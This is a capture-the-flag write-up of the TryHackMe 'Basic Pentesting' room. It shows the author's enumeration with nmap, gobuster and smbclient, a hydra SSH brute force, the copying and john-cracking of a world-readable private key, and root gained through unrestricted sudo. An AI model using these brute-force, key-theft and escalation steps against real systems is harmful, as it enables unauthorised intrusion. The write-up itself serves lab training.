# Basic Pentesting â€” Write-up (TryHackMe)

**Platform:** TryHackMe  
**Room:** Basic Pentesting  
**Difficulty:** Easy  

---

## 1. Executive Summary

This assessment details the exploitation of a Linux host to achieve full system compromise. The attack chain leveraged information disclosure flaws to obtain initial access, followed by lateral movement and privilege escalation.

**Attack Chain Overview:**
1.  **Initial Access:** Achieved via SSH brute-force, facilitated by username enumeration and weak password hints discovered via **Web and SMB information leakage**.
2.  **Lateral Movement:** Exploited **weak file permissions** on a private SSH key to pivot from user `jan` to `kay`.
3.  **Privilege Escalation:** Exploited a **misconfigured Sudoers file** allowing the user `kay` to execute commands as root without restriction.

---

## 2. Reconnaissance & Enumeration

### Connectivity & Service Discovery
A full TCP port scan was performed using Nmap to identify the attack surface.

```bash
nmap -sV -sC -p- <TARGET_IP>
```

**Key Findings:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh (OpenSSH 7.2p2 Ubuntu)
80/tcp   open  http (Apache httpd 2.4.18)
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy (Apache Tomcat)
```

**Analysis:**
The open ports indicate a Linux host running a Web Server (Apache/Tomcat) and File Sharing services (SMB), presenting multiple vectors for potential information leakage.

---

## 3. Web Enumeration (Information Disclosure)

### Hidden Directory Discovery

Directory brute-forcing identified a non-standard directory.

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```
*Result:* Found `/development` (Status: 301).

### Analysis of Leaked Files

Accessing `http://<TARGET_IP>/development/` revealed that **Directory Listing** was enabled. Two text files were exposed:

1.  **`dev.txt`**: Mentioned internal server configurations and a user named **"K"** (Kay).
2.  **`j.txt`**: A note to **"J"** (Jan) explicitly stating: *"your password is weak"*.

**Impact:** Confirmed existence of users and a specific vulnerability (weak password) for user `jan`.

---

## 4. SMB Enumeration

To corroborate discovered usernames and collect additional internal artifacts, SMB shares were enumerated.

```bash
smbclient -L //<TARGET_IP> -N
```

**Shares Identified:**
- `Anonymous` (Disk) - *Accessible without credentials*
- `IPC$`

Retrieving contents from the `Anonymous` share:
```bash
smbclient //<TARGET_IP>/anonymous -N
get staff.txt
```

**Content of `staff.txt`:**
> *"I know it's all in fun... This means you too, Jan! - Kay"*

**Conclusion:** The internal memo validated `jan` and `kay` as active targets, with `jan` being the primary candidate for an initial brute-force attack due to the earlier "weak password" hint.

---

## 5. Initial Access (SSH)

Leveraging the verified intelligence (User: `jan`), I launched a targeted brute-force attack.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
```

**Result:** Password successfully recovered.

**Access Verification:**
```bash
ssh jan@<TARGET_IP>
whoami
# Output: jan
```

---

## 6. Lateral Movement (Jan -> Kay)

Post-compromise enumeration revealed that user `jan` had limited privileges. I investigated the `/home` directories for misconfigurations.

### Vulnerability: Weak File Permissions
Listing the contents of `/home/kay` revealed a critical security flaw: the `.ssh` directory and the private key were readable by other users.

```bash
ls -la /home/kay/.ssh/
```

**Output:**
```text
-rw-r--r-- 1 kay kay 1675 ... id_rsa
```
*Risk Analysis: The `-rw-r--r--` permission breaks local user isolation. Even though the key is encrypted, the world-readable permission allows any local user to copy it for offline cracking attacks.*

### Exploitation
1.  **Exfiltration:** I read the content of `id_rsa` and saved it to my attacker machine as `kay.key`.
2.  **Cracking:** The key was encrypted (`Proc-Type: 4,ENCRYPTED`). I used `ssh2john` and `john` to crack the passphrase.

```bash
ssh2john kay.key > kay.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kay.hash
```
*Result:* Passphrase recovered.

3.  **Authentication:**
```bash
chmod 600 kay.key
ssh -i kay.key kay@<TARGET_IP>
```

---

## 7. Privilege Escalation (Root)

Now authenticated as `kay`, I searched for artifacts and privilege boundaries.

### Artifact Discovery (Password Reuse)
A backup file named `pass.bak` was found in `kay`'s home directory.

```bash
cat /home/kay/pass.bak
```
The file contained a cleartext password. I validated this credential against the system user `kay`:

```bash
su kay
# Password: [REDACTED]
# Auth successful
```
*Finding: Password reuse confirmed.*

### Sudo Misconfiguration
Checking sudo permissions revealed the final vulnerability:

```bash
sudo -l
```

**Output:**
```text
User kay may run the following commands on linux:
    (ALL : ALL) ALL
```

**Exploitation:**
The user `kay` has unrestricted sudo access. I spawned a root shell:

```bash
sudo /bin/bash
whoami
# Output: root
```

**Status:** Root access confirmed. Flag retrieved.

---
